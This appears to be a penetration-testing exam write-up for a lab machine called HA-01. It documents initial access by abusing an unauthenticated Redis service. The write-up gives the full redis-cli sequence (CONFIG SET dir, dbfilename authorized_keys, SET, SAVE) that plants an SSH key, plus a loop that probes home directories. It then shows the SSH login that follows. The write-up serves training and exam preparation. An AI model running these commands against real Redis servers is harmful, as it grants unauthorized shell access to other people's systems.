---
type: machine-phase
project: OSCP-Exam-PoC
machine: HA-01
difficulty: Hard
phase: initial-access
status: completed
initial_user: devops
initial_access: Redis RDB persistence abuse
services:
  - Redis
  - SSH
tags:
  - oscp
  - hard
  - redis
  - unauthenticated-redis
  - rdb-persistence
  - ssh
  - authorized-keys
  - initial-access
flag_submitted: true
---
# HA-01 — User Foothold

> **Flag completion:** User flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Objective

Obtain Linux access through the exposed Redis service and establish an SSH session as the intended account.

The successful route used Redis persistence to place an SSH public key into:

```
/home/devops/.ssh/authorized_keys
```

This allowed authentication as `devops` using the corresponding private key generated on Kali.

## 2. Target Information

The successful foothold was obtained on the following instance:

|Service|Address|
|---|---|
|Target IP|`x.x.x.x`|
|Redis|`PORT_G/tcp`|
|SSH|`PORT_F/tcp`|
|SSH username|`devops`|

The challenge supplied:

```
ssh user@x.x.x.x -p PORT_F
```

However, the instructor's candidate username list and subsequent filesystem enumeration identified `devops` as the relevant account.

## 3. Redis Enumeration

### Connect to Redis

```
redis-cli -h x.x.x.x -p PORT_P
```

The initial instance exposed Redis on port `PORT_P`. Later instances used different external ports.

### Server information

The Redis server reported:

```
redis_version:7.0.15
redis_mode:standalone
os:Linux 6.8.0-147-generic x86_64
arch_bits:64
gcc_version:12.2.0
executable:/redis-server
config_file:/etc/oscp-redis.conf
```

### Authentication and ACL

The earlier instance returned:

```
user default on nopass ~* &* +@all
```

This established that the default Redis user required no password and had unrestricted command-category permissions.

Other earlier configuration findings:

```
protected-mode: no
bind: 0.0.0.0
dir: /tmp
dbfilename: dump.rdb
save: ""
appendonly: no
```

Runtime configuration changes were permitted.

### Initial key enumeration

Commands:

```
INFO keyspace
DBSIZE
SCAN 0 MATCH * COUNT 100
```

Output identified one key:

```
build:token
```

Its value was:

```
IT{FLAG-SECRET}}
```

This was a canary value, not the actual user flag.

**Lesson:** Do not treat a value formatted like a flag as proof that the objective has been completed. Validate its context.

## 4. Identify the Linux Account

The instructor supplied candidate usernames. Rather than attempt password guessing, I used Redis's ability to change its persistence directory to test whether candidate filesystem paths existed.

The relevant Redis command was:

```
CONFIG SET dir /home/devops
```

It returned:

```
OK
```

This established that `/home/devops` existed and was accessible to the Redis process.

### Candidate-directory testing

The successful instance was tested with:

```
REDIS=x.x.x.x
PORT=PORT_G
RCLI=/usr/bin/redis-cli

for path in \
    /root/.ssh \
    /home/root \
    /home/operator \
    /home/sysadmin \
    /home/git \
    /home/jenkins \
    /home/oracle \
    /home/devops \
    /home/postgres \
    /home/www-data \
    /home/app \
    /home/maintenance
do
    result=$("$RCLI" -h "$REDIS" -p "$PORT" --raw CONFIG SET dir "$path" 2>&1)
    printf '%-25s %s\n' "$path" "$result"

    "$RCLI" -h "$REDIS" -p "$PORT" CONFIG SET dir /tmp >/dev/null 2>&1
done
```

The first attempt at this loop failed because Kali's `PATH` did not include `/usr/bin` and `/bin`. The corrected version used the absolute path:

```
RCLI=/usr/bin/redis-cli
```

### Results

```
/root/.ssh                ERR CONFIG SET failed (possibly related to argument 'dir') - Permission denied
/home/root                ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
/home/operator            ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
/home/sysadmin            ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
/home/git                 ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
/home/jenkins             ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
/home/oracle              ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
/home/devops              OK
/home/postgres            ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
/home/www-data            ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
/home/app                 ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
/home/maintenance         ERR CONFIG SET failed (possibly related to argument 'dir') - No such file or directory
```

The result for `devops` was the only successful home-directory match in this test.

### Check the SSH directory

Inside Redis:

```
CONFIG GET dir
CONFIG SET dir /home/devops/.ssh
```

Result:

```
1) "dir"
2) "/tmp"

OK
```

The `.ssh` directory was accessible.

This established a plausible shared-filesystem route between Redis and the SSH account.

## 5. Confirm Redis Can Write to the SSH Directory

Directory access alone does not prove write permission.

A harmless persistence probe was used.

Inside Redis:

```
CONFIG SET dir /home/devops/.ssh
CONFIG SET dbfilename ha01-write-probe.rdb
SAVE
```

The `SAVE` command returned:

```
OK
```

This confirmed that Redis could create an RDB snapshot in `/home/devops/.ssh`.

The initial test used a separate filename rather than overwriting `authorized_keys`.

At this point, the important conditions were established:

|Requirement|Evidence|
|---|---|
|`/home/devops` exists|`CONFIG SET dir` returned `OK`|
|`.ssh` exists|`CONFIG SET dir /home/devops/.ssh` returned `OK`|
|Redis can write there|`SAVE` returned `OK`|
|SSH service exists|Exposed SSH service on port `PORT_F`|

## 6. SSH Key Generation on Kali

A dedicated Ed25519 key pair was generated locally.

The intended location:

```
~/Desktop/HA01-keys/
├── devops
└── devops.pub
```

Command:

```
mkdir -p ~/Desktop/HA01-keys

ssh-keygen -t ed25519 \
  -f ~/Desktop/HA01-keys/devops \
  -N '' \
  -C 'HA01-devops'
```

The files serve different purposes:

|File|Purpose|
|---|---|
|`devops`|Private key; remains on Kali|
|`devops.pub`|Public key; placed into the target's SSH authorization file|

The private key must not be transferred to the target.

## 7. Write the Public Key Through Redis Persistence

The public key was read locally and padded with newline characters:

```
PUBKEY=$(cat ~/Desktop/HA01-keys/devops.pub)
KEY_CONTENT=$(printf '\n\n%s\n\n' "$PUBKEY")
```

The newline padding is important because Redis writes an RDB snapshot, not a plain-text public-key file.

The Redis persistence configuration was then changed:

```
REDIS=x.x.x.x
PORT=PORT_G
RCLI=/usr/bin/redis-cli

"$RCLI" -h "$REDIS" -p "$PORT" CONFIG SET dir /home/devops/.ssh

"$RCLI" -h "$REDIS" -p "$PORT" CONFIG SET dbfilename authorized_keys

"$RCLI" -h "$REDIS" -p "$PORT" SET ha01_ssh_key "$KEY_CONTENT"

"$RCLI" -h "$REDIS" -p "$PORT" SAVE
```

The operations perform the following actions:

1. Set Redis's persistence directory to `/home/devops/.ssh`.
    
2. Set the RDB output filename to `authorized_keys`.
    
3. Store the padded public-key content in Redis.
    
4. Trigger a manual RDB snapshot.
    

**Result:** The persistence operation succeeded, and the subsequent target-side session confirmed that SSH access as `devops` had been obtained.

This technique depends on Redis and SSH using the relevant shared filesystem path.

## 8. SSH Access

The corresponding private key was used with the SSH service:

```
ssh -i ~/Desktop/HA01-keys/devops \
  -p PORT_F \
  devops@x.x.x.x
```

The later target shell prompt was:

```
devops@hard:~$
```

This confirms the resulting Linux execution context.

The exact SSH connection banner and the raw `id` output at initial login were not preserved in the examination record. The subsequent privilege-escalation investigation was performed from this `devops` shell.

## 9. Kali PATH Issue

During the process, Kali's shell was missing standard system directories from its `PATH`.

The failure:

```
Command 'mkdir' is available in the following places
 * /bin/mkdir
 * /usr/bin/mkdir

The command could not be located because '/bin:/usr/bin' is not included in the PATH environment variable.
mkdir: command not found
```

This was a local Kali shell issue, not a problem with the target.

The current terminal was corrected with:

```
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
hash -r
```

The same issue explained why the initial Redis enumeration loop could not find `redis-cli`. Using `/usr/bin/redis-cli` avoided the problem.

No package installation was required to fix this temporary shell issue.

## 10. Why This Method Worked

The successful route was based on the combination of three Redis capabilities:

|Capability|Security impact|
|---|---|
|Unauthenticated administrative access|An external user could issue Redis administrative commands|
|Runtime configuration changes|The persistence destination and filename could be changed|
|Manual RDB persistence|Redis could write its database snapshot to the selected filesystem location|

The vulnerable configuration allowed Redis persistence to reach a path used by the SSH account.

The resulting RDB file contained the padded public key in a form accepted by the SSH authorization mechanism.

The private key remained on Kali and was used for authentication.

## 11. Initial Access Evidence Registry

|Evidence|Result|
|---|---|
|Redis connection|Successful|
|Default ACL|`nopass`, `+@all` on earlier instance|
|Candidate account discovery|`/home/devops` accessible|
|SSH directory discovery|`/home/devops/.ssh` accessible|
|Harmless RDB write probe|`SAVE` returned `OK`|
|SSH key generation|Dedicated Ed25519 key pair|
|RDB output filename|`authorized_keys`|
|Final persistence operation|Successful|
|SSH identity|`devops`|
|Subsequent target prompt|`devops@hard:~$`|

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

---

## Related Notes

- [[HA-01 Overview]]
    
- [[Difficulty Levels/Hard/HA-01/root]]
    
- [[Exam Context/Exam Timeline|Exam Timeline]]
    
- [[Dashboard]]